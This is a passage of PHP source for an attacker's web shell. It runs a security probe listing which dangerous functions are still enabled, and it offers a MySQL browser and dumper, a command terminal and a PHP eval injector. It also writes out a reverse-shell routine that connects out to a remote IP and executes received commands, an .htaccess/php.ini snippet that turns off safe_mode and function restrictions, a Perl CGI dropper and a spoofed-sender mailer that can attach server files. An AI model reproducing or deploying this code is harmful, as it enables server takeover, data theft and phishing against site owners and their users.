		'pcntl_sigtimedwait','pcntl_sigwaitinfo','pcntl_strerrorp','pcntl_wait','pcntl_waitpid','pcntl_wexitstatus','pcntl_wifexited',
		'pcntl_wifsignaled','pcntl_wifstopped','pcntl_wstopsig','pcntl_wtermsig','pfsockopen','phpAds_XmlRpc','phpAds_remoteInfo',
		'phpAds_xmlrpcDecode','phpAds_xmlrpcEncode','php_uname','phpinfo','popen','posix_getgrgid','posix_getlogin','posix_getpwuid',
		'posix_kill','posix_mkfifo','posix_setpgid','posix_setsid','posix_setuid','posix_ttyname','posix_uname','posixc','proc_close',
		'proc_get_stats','proc_get_status','proc_nice','proc_open','proc_terminate','ps_aux','putenv','readlink','rename','rmdir',
		'runkit_function_rename','set_time_limit','sh2_exec','shell_exec','show_source','sleep','socket_accept','socket_bind',
		'socket_clear_error','socket_close','socket_connect','socket_create','socket_create_listen','socket_create_pair',
		'socket_get_option','socket_getpeername','socket_getsockname','socket_last_error','socket_listen','socket_read',
		'socket_recv','socket_recvfrom','socket_select','socket_send','socket_sendto','socket_set_block','socket_set_nonblock',
		'socket_set_option','socket_shutdown','socket_strerror','socket_write','str_rot13','stream_select','stream_socket_server',
		'symlink','syslog','system','tp_exec','virtual','xmlrpc_entity_decode');

		sort($security); 
		$fucks=array_unique(array_merge($disable_functions,$security));
		$table="";
		$enable=0;
		$disable=0;
		$die=array();
		$ready=array();
		$off=array();
		$total=count($fucks);

		foreach($fucks as $fuck)
		{
			$table.="<tr><td></td><td>$fuck</td><td>";
			if(in_array($fuck,$disable_functions))
			{
				$table.="<center><font color=red>DIE</font></center>";
				$die[]=$fuck;
				$disable++;
			}
			else
			{
				if(function_exists($fuck)||is_callable($fuck))
				{
					$table.="<center><font color=green>READY</font></center>";
					$ready[]=$fuck;
					$enable++;
				}
				else
				{
					$table.="<center><font color=orange>OFF</font></center>";
					$off[]=$fuck;
					$disable++;
				}
			}
			$table.="</td></tr>";
		}

		$risk=($enable/$total)*100;
		$secure=($disable/$total)*100;

		printf("<h2 style='text-align:center'>Sec. Info v2.0.%s</h2><br>
			<h4 style='text-align:center;color:var(--txt-color)'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=green>[%s%%]</font></h4><br><br>
			<div class='auto-number'>
				<table class='table sortable'>
					<thead>
						<tr>
							<th class='sorttable_nosort' width='15'>No.</th>
							<th>Disable Function</th>
							<th>Status</th>
						</tr>
					</thead>
					<tbody>
						%s
					</tbody>
				</table>
				<fieldset style='margin-bottom:15px'>
					<legend>Ready List</legend>
					<textarea>%s</textarea>
				</fieldset>
				<div class='divide'>
					<div class='divide-left'>
						<fieldset style='margin-bottom:15px'>
							<legend>Off List</legend>
							<textarea>%s</textarea>
						</fieldset>
					</div>
					<div class='divide-right'>
						<fieldset>
							<legend>Die List</legend>
							<textarea>%s</textarea>
						</fieldset>
					</div>
			</div>",$total,round($risk,2),round($secure,2),$table,implode($ready, ', '),implode($off, ', '),implode($die, ', '));
	}
	if($_REQUEST['x']=="info")
	{
		printf("<div id='php-configuration'>
			<form onsubmit='return false;' class='new'>
				<select id='php-config'>
					<option value='4'>INFO_CONFIGURATION</option>
					<option value='16' selected>INFO_ENVIRONMENT</option>
					<option value='32'>INFO_VARIABLES</option>
					<option value='8'>INFO_MODULES</option>
					<option value='1'>INFO_GENERAL</option>
					<option value='2'>INFO_CREDITS</option>
					<option value='64'>INFO_LICENSE</option>
					<option value='-1'>INFO_ALL</option>
				</select>
				<input type='submit' onclick=\"return getAjax(true,'php-info','POST','?x=info&xa=envirolment&config='+document.getElementById('php-config').value);\"/><br>
			</form>
		</div>
		<div id='php-info' class='result'></div>");

		$cores=array('PHP_VERSION','PHP_MAJOR_VERSION','PHP_MINOR_VERSION','PHP_RELEASE_VERSION','PHP_VERSION_ID',
				  'PHP_EXTRA_VERSION','PHP_ZTS','PHP_DEBUG','PHP_MAXPATHLEN','PHP_OS','PHP_OS_FAMILY','PHP_SAPI',
				  'PHP_EOL','PHP_INT_MAX','PHP_INT_MIN','PHP_INT_SIZE','PHP_FLOAT_DIG','PHP_FLOAT_EPSILON',
				  'PHP_FLOAT_MIN','PHP_FLOAT_MAX','DEFAULT_INCLUDE_PATH','PEAR_INSTALL_DIR','PEAR_EXTENSION_DIR',
				  'PHP_EXTENSION_DIR','PHP_PREFIX','PHP_BINDIR','PHP_BINARY','PHP_MANDIR','PHP_LIBDIR','PHP_DATADIR',
				  'PHP_SYSCONFDIR','PHP_LOCALSTATEDIR','PHP_CONFIG_FILE_PATH','PHP_CONFIG_FILE_SCAN_DIR',
				  'PHP_SHLIB_SUFFIX','PHP_FD_SETSIZE');

		$table="";
		foreach($cores as $core)
		{
			$table.="<tr><td>".$core."</td><td>".@constant($core)."</td></tr>";
		}

		printf("<h2>Core Predefined Constants</h2><br>
				<table class='table'>
					<thead>
						<tr>
							<th>Predefined Constants</th>
							<th>Value</th>
						</tr>
					<tbody>%s</tbody>
				</table>",$table);

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="envirolment")
		{
			ob_clean();
			phpinfo($_REQUEST['config']);
			$phpinfo=ob_get_contents();
			ob_end_clean();
			$phpinfo=preg_replace('%^.*<body>(.*)</body>.*$%ms','$1',$phpinfo);
			printf("<div id='phpinfo'>%s</div>",$phpinfo);
			exit;
		}
	}
	if($_REQUEST['x']=="db")
	{
		$connect=any("connect",$_SESSION)?$_SESSION['connect']:"";
		$status=any("status",$_SESSION)?$_SESSION['status']:"";
		$query=any("query",$_REQUEST)?$_REQUEST['query']:"show databases;";

		if($connect==true)
		{
			$process="";
			$sql=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);
			/* 
			$result=mysql_list_processes($sql);
			while($row=mysql_fetch_assoc($result))
			{
			    $process.=sprintf("<tr>
			    	<td>%s</td><td>%s</td><td>%s</td>
			    	<td>%s</td><td>%s</td></tr>",
			    	$row["Id"],$row["Host"],$row["db"],
			    	$row["Command"],$row["Time"]);
			}
			mysql_free_result($result); 
			*/
			
			printf("<div class='database-session'>
						<div class='database-query'>
							<form action='?x=db&xa=qry' method='post'>
								<label>MYSQL Query<hr></label><br>
								<label><i style='color:#222'>
								show databases;<br>
								show tables from {database};<br>
								show columns from {database}.{table};<br>
								select count(*) from {database}.{table};<br>
								select * from {database}.{table}limit 0,10;</i></label>
								<textarea id='query' name='query'>%s</textarea><br>
								<input type='submit' name='disconnect' value='Disconnect'/>
								<input type='submit' value='Execute'/>
							</form>
						</div>
						<div class='database-process'>
							<!-- div class='mysql-process-result'>
								<label>Database Process <a href='?x=db&xa=proc'>&#9851;</a><hr></label>
								<table class='table table-bordered'>
									<thead>
										<tr>
											<th>Id</th>
											<th>Host</th>
											<th>Database</th>
											<th>Command</th>
											<th>Time</th>
										</tr>
									</thead>
									<tbody>%s</tbody>
								</table>
							</div -->
							<div class='database-dump'>
								<label>Database Dump<hr></label>
								<form action='?x=db&xa=dmp' method='post'><br>
									<label>Database</label><input type='text' name='database' value=''/><br>
									<label>Output</label><input type='text' name='output' value='%s'/><br>
									<input type='submit' value='Dump' />
									<label>%s</label>
								</form>
							</div>
						</div>
						<div class='clr'></div>
					</div>
					",$query,$process,$dir,$status);
		
		}
		else
		{
			printf("<div id='database'>
					<form action='?x=db&xa=db' method='post' class='new'><br>
						<label>Host</label><input type='text' name='host' value='localhost'/><br>
						<label>Port</label><input type='text' name='port' value='3306'/><br>
						<label>Username</label><input type='text' name='user' value='root'/><br>
						<label>Password</label><input type='text' name='pass' value=''/><br>
						<label>Database</label><input type='text' name='dbas' value=''/><br>
						<input type='submit' value='Connect'/>
					</form>
				</div>");
		}

		if(any("rs",$_REQUEST))
		{
			$_SESSION[$_REQUEST['rs']]='';
		}

		if(any("cd",$_REQUEST))
		{
			$_SESSION['qdb']=$_REQUEST['cd'];
		}

		if(any("ct",$_REQUEST))
		{
			$_SESSION['qtb']=$_REQUEST['ct'];
		}

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="db")
		{	
			$cn=mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],$_REQUEST['dbas'],$_REQUEST['port']);

			$_SESSION['host']=$_REQUEST['host'];
			$_SESSION['port']=$_REQUEST['port'];
			$_SESSION['user']=$_REQUEST['user'];
			$_SESSION['pass']=$_REQUEST['pass'];
			$_SESSION['dbas']=$_REQUEST['dbas'];

			if($cn)
			{
				$_SESSION['connect']=true;
				header('location:'.php_self.'?x=db');
			}
			else
			{
				$_SESSION['connect']=false;
				printf("<b class='off'>Connection Failed</b>");
			}
		}

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="qry")
		{
			$_SESSION['status']='';
			$con=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);

			if(isset($_REQUEST['disconnect']))
			{
				mysqli_close($con);
				unset($_SESSION['connect']);
				unset($_SESSION['query']);
				unset($_SESSION['host']);
				unset($_SESSION['user']);
				unset($_SESSION['pass']);
				unset($_SESSION['dbas']);
				unset($_SESSION['qdb']);
				unset($_SESSION['qtb']);
				header('location:'.php_self.'?x=db');
			}

			$sql=!empty($_REQUEST['query'])?$_REQUEST['query']:"show databases;";
			$result=mysqli_query($con,$sql);
			$data=array();
			$name=array();

			if($result)
			{
				while($fieldinfo=mysqli_fetch_field($result))
				{
					$name[]=$fieldinfo->name;
				}
				$data[]=$name;
				while($row=mysqli_fetch_row($result))
				{
					$data[]=$row;
				}
				mysqli_free_result($result);
			}
			else
			{
				$data=false;
			}

			if($data!==false)
			{
				$sqdb=isset($_SESSION['qdb']) ? $_SESSION['qdb'] : '';
				$sqtb=isset($_SESSION['qtb']) ? $_SESSION['qtb'] : '';

				$bsdb="<a href='?x=db&xa=qry&rs=qdb&query=show databases;'>Database</a>";
				$bqdb=!empty($_SESSION['qdb'])?"&#8594;	<a href='?x=db&xa=qry&rs=qtb&query=show tables from $sqdb;'>$sqdb</a>":"";
				$bqtb=!empty($_SESSION['qtb'])?"&#8594;	<a href='?x=db&xa=qry&query=show columns from $sqdb.$sqtb;'>$sqtb</a>":"";

				printf("<div class='database=table'>
						<div class='database-breadcrumb'>%s %s %s</div>
						<div class='auto-number'>
						<table class='table sortable'>",$bsdb,$bqdb,$bqtb);

				foreach($data as $key => $val)
				{
					if(is_array($val))
					{
						if($key==0)
						{
							print "<tr><th class='sorttable_nosort'>&#9776;</th>";
							foreach($val as $key2 => $val2)
							{
								if(!is_array($val2))
								{
									print "<th>".$val2."</th>";
								}
							}
							print "</tr>";
						}
						else
						{
							print "<tr><td width='15'></td>";
							foreach($val as $key3 => $val3)
							{
								if(!is_array($val3))
								{
									if(strpos($val2,'Database')!==false)
									{
										print "<td><a href='?x=db&xa=qry&cd=$val3&query=show tables from $val3;'>$val3</a></td>";
									}
									elseif(strpos($val2,'Tables')!==false)
									{
										$val4=substr($val2,strpos($val2,'Tables_in_')+10);
										print "<td><a href='?x=db&xa=qry&cd=$val4&ct=$val3&query=select * from $val4.$val3 limit 0,10;'>$val3</a></td>";
									}
									else
									{
										print "<td>$val3</td>";
									}
								}
							}
							print "</tr>";
						}
					}
				}
				print "</table></div></div>";
			}
			else
			{
				print '<span class=off>Query not Executed</span>';
			}
		}

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="dmp")
		{
			$database=$_REQUEST['database'];
			$output=$_REQUEST['output'];
			if (!file_exists($output)&&!empty($database)) 
			{
				$link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
				mysqli_set_charset($link,'utf8');
				mysqli_select_db($link,$database);
				$tables=array();
				$result=mysqli_query($link,'SHOW TABLES');
				while($row=mysqli_fetch_row($result))
				{
					$tables[]=$row[0];
				}
				$return='SET FOREIGN_KEY_CHECKS=0;' . "\r\n";
				$return.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . "\r\n";
				$return.='SET AUTOCOMMIT=0;' . "\r\n";
				$return.='START TRANSACTION;' . "\r\n";
				foreach($tables as $table)
				{
					$result=mysqli_query($link,'SELECT * FROM '.$table);
					$num_fields=mysqli_num_fields($result);
					$num_rows=mysqli_num_rows($result);
					$i_row=0;
					$row2=mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
					$return.="\n\n".$row2[1].";\n\n";
					if ($num_rows!==0) {
						$row3=@mysqli_fetch_fields($result);
						$return.='INSERT INTO '.$table.'( ';
						foreach ($row3 as $th) 
						{ 
							$return.='`'.$th->name.'`,';
						}
						$return=substr($return,0,-2);
						$return.=' ) VALUES';
						for ($i=0;$i < $num_fields;$i++) 
						{
							while($row=mysqli_fetch_row($result))
							{
								$return.="\n(";
								for($j=0;$j<$num_fields;$j++) 
								{
									$row[$j]=addslashes($row[$j]);
									$row[$j]=preg_replace("#\n#","\\n",$row[$j]);
									if (isset($row[$j])) { $return.='"'.$row[$j].'"';}else { $return.='""';}
									if ($j<($num_fields-1)) { $return.=',';}
								}
								if (++$i_row==$num_rows) {
									$return.=");";
								}else {
									$return.="),";
								}  
							}
						}
					}
					$return.="\n\n\n";
				}
				$return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
				$return.='COMMIT;';
				$output=pathinfo($otput)['extension']=='sql'?$output:$output.'.sql';
				$handle=fopen($output,'w+');
				fwrite($handle,$return);
				fclose($handle);
				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s' target='_blank'>'%s'</a>",urle($output),basename($output));	    
			}
			else
			{
				$_SESSION['status']="<span class=off>Dump Error</span>";
			}
			
			header('location:'.php_self.'?x=db');
		}

	}
	if($_REQUEST['x']=="terminal")
	{
		printf("
			<div id='terminal'>
				<textarea id='prompt-terminal' class='cmd' cols='122' rows='20' readonly>%s</textarea>
				<form onsubmit='return false;'>
					<label id='curdir-terminal'>$ %s:</label>
					<input type='text' id='terminal-input' autocomplete='off' onfocus=\"\" onkeydown=\"
						if(event.keyCode==13) 
						{
							temp=this.value;
							this.value='';
							getAjax(true,'curdir-terminal','POST','?x=terminal&xa=terminals-curdir&cmd='+temp);
							return getAjax(false,'prompt-terminal','POST','?x=terminal&xa=terminals&cmd='+temp);
						}
					\" class='cmd' name=cmd cols=380 rows=2></input>
				</form>
			</div>",Execute('whoami'),$dir);

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals")
		{	
			ob_clean();
			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
			@chdir($dir);
			$charset='UTF-8';
			if(!Unix())
			{
				$charset='Windows-1251';
			}
			$ret=iconv($charset,'UTF-8',Execute($command));
			print $ret;
			exit;
		}
		elseif(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals-curdir")
		{	
			ob_clean();
			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
			if (preg_match('/cd (.*)/',$command,$dirx))
			{
				if ($dirx[1]=='..')
				{
					$dir=substr($dir,0,strrpos($dir,_));
					if (strlen($dir)<=2) $dir=$dir._;
				}
				else
				{
					if (is_dir($dirx[1]))
					{
						$dir=realpath($dirx[1]);
					}
				}
			}
			$_SESSION['c']=urle($dir);
			print '$ '.$dir.':';
			exit;
		}
	}
	if($_REQUEST['x']=="connect")
	{
		printf("<div id='connect'>
				<div class='connect-left'>
					<div class='Reverse-connect'>
						<fieldset>
							<legend>Reverse Connect</legend>
							<form action='?x=connect&xa=reverse-connect' method='post' onsubmit=\"
								return confirm('HOST will FUCKED ON ur PC or LAPTOP ?!\\nMake Sure ur FIREWALL OFF ?!\\nUSE NETCAT {nc -lvp ' + document.getElementById('reverse-port').value+'}\\n\\nTYPE \'exit\' or \'quit\' to TERMINATE')\">
								<label>Remote Ip</label><input type='text' name='reverse-ip' value='%s'/><br>
								<label>Remote Port</label><input type='text' id='reverse-port' name='reverse-port' value='1337'/><br>
								<label>Socket</label><select name='socket'>
									<option value='fsockopen'>fsockopen</option>
									<option value='socket_create'>socket_create</option>
									<option value='stream_socket_client'>stream_socket_client</option>
								</select><br>
								<input type='submit' value='Connect'  />
							</form>
						</fieldset>
					</div>
				</div>
				<div class='connect-right'>
					<div class='status-connect'>
						<fieldset>
 							<legend>Status</legend>
							<div id='connect-result'>Terminal: %s",
							remote_addr,Execute('whoami') 
		);

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="reverse-connect")
		{
			if($_REQUEST['socket']=="fsockopen")
			{
				$host=$_REQUEST['reverse-ip'];
				$port=$_REQUEST['reverse-port'];
				$sock=@fsockopen($host,$port,$errno,$errstr);
				if($errno!=0)
				{
					printf("<font color='red'><b>%s</b>:%s</font>",$errno,$errstr);
				}
				else
				{
					while(!feof($sock)) 
				    {
				    	fwrite($sock,"[b4tm4n]:");
				        $command=fgets($sock,1024);
				        if(trim($command)=='quit'||trim($command)=='exit')
					    {
					    	fclose($sock);
					    	printf($command);
					    	exit;
					   }
				       fwrite($sock,Execute($command));
				   }
				    fclose($sock);
				}
			}
			else if($_REQUEST['socket']=="socket_create")
			{
				$host=$_REQUEST['reverse-ip'];
				$port=$_REQUEST['reverse-port'];
				$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
				socket_set_nonblock($sock);
				if(!$sock)
				{
					printf("<font color='red'>Connection Error</font>");
				}
				else
				{
					while(!@socket_connect($sock,$host,$port)) 
					{
					    @socket_write($sock,"[b4tm4n]:",strlen ("[b4tm4n]:"));
					    $input=@socket_read($sock,1024,PHP_NORMAL_READ);
					    if (trim($input)=='quit'||trim($input)=='exit')
					    {
					    	socket_set_block($sock);
					    	socket_close($sock);
					    	printf($input);
					    	exit;
					   }
					   @socket_write($sock,Execute($input),strlen (Execute($input)));
					}
					socket_set_block($sock);
					socket_close($sock);
				}
			}
			else if($_REQUEST['socket']=="stream_socket_client")
			{
				$host=$_REQUEST['reverse-ip'];
				$port=$_REQUEST['reverse-port'];
				$sock=@stream_socket_client("tcp://$host:$port",$errno,$errstr);
				if (!$sock) 
				{ 
				    printf("<font color='red'><b>%s</b>:%s</font>",$errno,$errstr);
				}
				else 
				{ 
					while(!feof($sock)) 
				    { 
				    	fwrite($sock,"[b4tm4n]:");
				        $command=fgets($sock,1024);
				        if(trim($command)=='quit'||trim($command)=='exit')
					    {
					    	fclose($sock);
					    	printf($command);
					    	exit;
					   }
				        fwrite($sock,Execute($command));
				   }
				    fclose($sock);
				}
			}
		}
		printf("</fieldset></div></div></div></div>");
	}
	if($_REQUEST['x']=="htaccess")
	{
		$php_ini=array(
			"php_value upload_max_filesize 32M",
			"php_value post_max_size 32M",
			"php_flag safe_mode Off",
			"php_value disable_functions null",
			"php_flag safe_mode_gid Off",
			"php_value open_basedir $dir",
			"php_flag register_globals On",
			"php_flag exec On",
			"php_flag shell_exec On");

		$htaccess=array(
			"Options All",
			"Allow From All",
			"Satisfy Any");

		printf("
			<div class='divide'>
				<div class='divide-left'>
					<textarea>%s</textarea>
				</div>
				<div class='divide-right'>
					<textarea>%s</textarea>
				</div>
			</div>",implode($php_ini,"\n"),implode($htaccess,"\n"));
	}
	if($_REQUEST['x']=="php")
	{	
		$exp=array(
			"print_r(get_extension_funcs('Core'));",
			"print_r(get_loaded_extensions());",
			"print_r(ini_get_all('pcre'));",
			"print_r(ini_get_all());",
			"print_r(get_defined_constants());",
			"print_r(get_defined_functions());",
			"print_r(get_declared_classes());");
		
		printf("<div id='php'>
					<form onsubmit='return false;'>
						<div class='php-left'>
							<textarea id='php-code' cols='122' rows='20'>%s</textarea>
						</div>
						<div class='php-right'>
							<textarea id='php-eval' cols='122' rows='20' readonly></textarea>
						</div>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&codex='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Inject'/>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value='Run'/>
					</form>
				</div>",implode($exp,"\n"));

		if(any("code",$_REQUEST))
		{
			ob_clean();
			$code=trim($_REQUEST['code']);
			$evil=Evil($code);
			exit;
		}
		if(any("codex",$_REQUEST))
		{
			ob_clean();
			$code=trim($_REQUEST['codex']);
			$evil=Evil($code,true);
			exit;
		}
	}
	if($_REQUEST['x']=="perl")
	{
		print 'PHP Perl Class: '.(class_exists('Perl')?"<b class='on'>ON</b>":"<b class='off'>OFF</b>").'<br>';

		if(Unix())
		{
			if(file_exists("/usr/bin/perl"))
			{
				$path_perl="/usr/bin/perl";
			}
			else
			{
				$path_perl="/usr/bin/env perl";
			}
		}
		else
		{
			if(file_exists("C:\\perl\bin\perl.exe"))
			{
				$path_perl="C:\\perl\bin\perl.exe";
			}
			elseif(file_exists("C:\\wamp\bin\perl.exe"))
			{
				$path_perl="C:\\wamp\bin\perl.exe";
			}
			elseif(file_exists("C:\\xampp\perl\bin\perl.exe"))
			{
				$path_perl="C:\\xampp\perl\bin\perl.exe";
			}
		}
		
		$script=array(
			"#!$path_perl",
			"use strict;",
			"use warnings;",
			"use CGI;",
			"print CGI::header();",
			"print 'maRidoNo on CGI';");

		$htaccess=array(
			"Options +ExecCGI +SymLinksIfOwnerMatch",
			"DirectoryIndex index.ler",
			"AddType application/x-httpd-cgi .ler",
			"AddHandler cgi-script .ler");

		$path=$dir._.'cgi-bin';
		$file=$path._.'perl.ler';
		$file2=$path._.'.htaccess';

		$scripts=implode($script,"\n");
		$htaccesss=implode($htaccess,"\n");

		if(!is_dir($path))
		{
			mkdir($path,0755);
		}
		if(!is_file($file))
		{
			$op=fopen($file,'w+');
			fwrite($op,$scripts);
			fclose($op);
			chmod($file,0755);
		}
		if(!is_file($file2))
		{
			$op=fopen($file2,'w+');
			fwrite($op,$htaccesss);
			fclose($op);
			chmod($file2,0755);
		}

		$redirect=GetUrlFromPath($file);
		printf("Tested -> <a href='$redirect' target='_blank'><u>Link</u></a>");
		
		if (class_exists('Perl'))
		{
			//$perl=Perl::getInstance();
			$perl=new Perl();
			$perl->eval("print \"Executing Perl code in PHP\n\"");
			print "Hello from PHP! ";

			//$perl=new Perl();
			$perl->require($file);
			$val=$perl->somePhpFunc('test');
			print $val;
		}
	}
	if($_REQUEST['x']=="mail")
	{
		printf("

			<div class='divide'>
				<div class='divide-left'>
					<fieldset>
						<legend>Mail</legend>
						<form onsubmit='return false;' class='mail'>
							<label>From</label><input type='text' id='email-from' placeholder='Attacker <very@handsome.com>' value='Attacker <very@handsome.com>'/><br>
							<label>Reply To</label><input type='text' id='email-reply' placeholder=very@handsome.com' value='very@handsome.com'/><br>
							<label>To</label><input type='text' id='email-to' placeholder='Target 1 <target1@target.com>,Target 2 <target2@target.com>' value=''/><br>
							<label>Cc</label><input type='text' id='email-cc' placeholder='target1@target.com,target2@target.com' value=''/><br>
							<label>Bcc</label><input type='text' id='email-bcc' placeholder='target1@target.com,target2@target.com' value=''/><br>
							<label>Subject</label><input type='text' id='email-subject' placeholder='What You Waiting For ?' value=''/><br>
							<label>Attachment (FIlename)</label><input type='text' id='email-attachment' placeholder='%s' value=''/><br>
							<label>Messages</label><input type='text' id='email-message'/><br>
							<input type='submit' value='Send' onclick=\"

								getAjax(true,
									'send-result',
									'POST',
									'?x=mail&xa=send'+
									'&from='+document.getElementById('email-from').value+
									'&reply='+document.getElementById('email-reply').value+
									'&to='+document.getElementById('email-to').value+
									'&cc='+document.getElementById('email-cc').value+
									'&bcc='+document.getElementById('email-bcc').value+
									'&subject='+document.getElementById('email-subject').value+
									'&message='+document.getElementById('email-message').value+
									'&attachment='+document.getElementById('email-attachment').value);

							\"/>	
						</form>
					</fieldset>
				</div>
				<div class='divide-right'>
					<fieldset>
						<legend>Result's</legend>
						<div id='send-result'></div>
					</fieldset>
				</div>
			</div>

		",php_self);

		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='send')
		{
			ob_clean();
			$from=$_REQUEST['from'];
			$reply=$_REQUEST['reply'];
			$to=$_REQUEST['to'];
			$cc=$_REQUEST['cc'];
			$bcc=$_REQUEST['bcc'];
			$subject=$_REQUEST['subject'];
			$msg=$_REQUEST['message'];
			$attachment=$_REQUEST['attachment'];
			$uid=md5(uniqid(time()));

			$headers[]="From: $from";
			$headers[]="Reply-To: $reply";
			$headers[]="To: $to";
			if(!empty($cc)) $headers[]='Cc: $cc';
			if(!empty($bcc)) $headers[]='Bcc: $bcc';
			$headers[]="MIME-Version: 1.0";
			$headers[]="Content-Type: multipart/mixed; boundary=\"$uid\"";

			$messages[]="--$uid";
		    $messages[]="Content-type: text/html; charset=\"iso-8859-1\"";
		    $messages[]="Content-Transfer-Encoding: 8bit";
		    $messages[]="";
		    $messages[]="$msg";
		    $messages[]="";

			if(is_file($attachment))
			{
				$content=file_get_contents($attachment);
				$content=chunk_split(B64E($content));
				$name=basename($attachment);
				$mime=mime_content_type($attachment);

				$messages[]="--$uid";
			    $messages[]="Content-Type: $mime; name=\"$name\"";
			    $messages[]="Content-Transfer-Encoding: base64";
			    $messages[]="Content-Disposition: attachment";
			    $messages[]="";
			    $messages[]="$content";
			    $messages[]="";
			    $messages[]="--$uid--";
			}

			$message=implode("\r\n",$messages);
			$header=implode("\r\n",$headers);

			if(mail($to,$subject,$message,$header))
			{
				print "Email Send";
			}
			else 
			{
				$error=error_get_last();
				print "Error :" . $error['message'];
			}
			exit;
		}
	}
	if($_REQUEST['x']=='process')
	{
		printf("<div id='process-kill'><form class='new' method='post' action='?x=process&xa=kill'>
					<label>PID</label> <input type='text' name='pid'/>
					<input type='submit' value='Kill'/><br>
					<label>Name</label> <input type='text' name='name'/>
					<input type='submit' value='Kill'/>
				</form></div>");

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="kill")
		{
			$pid=$_REQUEST['pid'];
			$name=$_REQUEST['name'];

			if(Unix())
			{
				$kill=Execute("kill 9 $pid");
				$kill=Execute("kill 9 $name");
				if($kill) print '<font class="off">Process Killed</font>';
			}
			else
			{
				$kill=Execute("taskkill /f /pid $pid");
				$kill=Execute("taskkill /f /im $name");
				if($kill) print '<font class="off">Process Killed</font>';
			}
		}

		if(Unix())
		{
			$ret=iconv('UTF-8','UTF-8',Execute('ps aux'));
			print '<div id="process-list"><pre>'.$ret.'</pre></div>';
		}
		else
		{
			$ret=iconv('Windows-1251','UTF-8',Execute('tasklist'));
			print '<div id="process-list"><pre>'.$ret.'</pre></div>';
		}
	}
	if($_REQUEST['x']=='shells')
	{
		print "Coming Soon";
	}
	if($_REQUEST['x']=='symlink')
	{
		print "Coming Soon";
	}
	if($_REQUEST['x']=="account")
	{
		printf("<div id='account'><form class='new' method='post' action='?x=account&xa=change'>
					<label>Username</label> <input type='text' name='change-username' autocomplete='off' value='%s'/> <br>
					<label>Password</label> <input type='text' name='change-password' autocomplete='off'value=''/><br>
					<input type='submit' value='Change' onclick=\"return confirm('Sure ?');\"/>
				</form></div>",B64D($account[0]));

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="change")
		{
			$filename=script_filename;
			$username=$_REQUEST['change-password'];
			$password=$_REQUEST['change-username'];

			if (!empty($username)&&!empty($password))
			{
				$user_from=$account[0];
				$user_to=B64E($password);
				$content=file_get_contents($filename);
				$chunk=explode($user_from,$content);
				$content=implode($user_to,$chunk);
				$change=file_put_contents($filename,$content);

				$pass_from=$account[1];
				$pass_to=sha1(md5($username));
				$content=file_get_contents($filename);
				$chunk=explode($pass_from,$content);
				$content=implode($pass_to,$chunk);
				$change=file_put_contents($filename,$content);

				if($change)
				{
					session_destroy();
					session_regenerate_id();
					header('location:'.php_self);
				}
				else
				{
					printf("Error change account");
				}
			}
			else
			{
				printf("<b class='off'>Mistakes !</b>");
			}
		}
	}
	if($_REQUEST['x']=="action")
	{
		$files=any('chk',$_REQUEST)?$_REQUEST['chk']:array();
		$value=any('action-value',$_REQUEST)?$_REQUEST['action-value']:$_REQUEST['action-option'];
		$tmp="";
		$row="";
		$count_dirs=0;
		$count_files=0;
		
		foreach($files as $file)
		{
			if(is_dir(urld($file)))
			{
				$count_dirs++;
			}
			if(is_file(urld($file)))
			{
				$count_files++;
			}

			$row.="<tr><td>".urld($file)."</td></tr>";
			$tmp.=urld($file).",";
		}

		if(count($files)==1&&$value=='copy')
		{
			header('location:'.php_self.'?a=cp&r='.$files[0]);
		}

		if(count($files)==1&&$value=='move')
		{
			header('location:'.php_self.'?a=mv&r='.$files[0]);
		}

		if(!any('xa',$_REQUEST)&&$value=='delete')
		{
			printf("<h4>Dir's: [%s] File's: [%s]</h4>
					<table class='table'>%s</table>
					<form class='new' method='post' action='?x=action&xa=option'>
						<input type='hidden' name='action-option' value='%s'/>
						<input type='hidden' name='tmp' value='%s'/>
						<input type='submit' value='Remove'/>
					</form>",
					$count_dirs,
					$count_files,
					$row,
					$value,
					$tmp);
		}

		if(!any('xa',$_REQUEST)&&$value!='delete')
		{
			printf("<h4>Dir's: [%s] File's: [%s]</h4>
					<table class='table'>%s</table>
					<form class='new' method='post' action='?x=action&xa=option'>
						<script>window.onload=function(e){document.getElementById('action_option').value='%s'}</script>
						<select name='action-option' id='action_option'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='zip'>Archive (zip)</option>
							<option value='unzip'>Extract to (zip)</option>
						</select>
						<i>-></i>
						<input type='hidden' name='tmp' value='%s'/>
						<input type='text' name='newloc' value='%s'/>
						<input type='submit' value='Process'/>
					</form>",
					$count_dirs,
					$count_files,
					$row,
					$value,
					$tmp,
					$dir._);
		}

		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='option')
		{
			$files=array_filter(explode(',',$_REQUEST['tmp']));
			$newloc=trim(@$_REQUEST['newloc']);
			$succ=0;
			$fail=0;

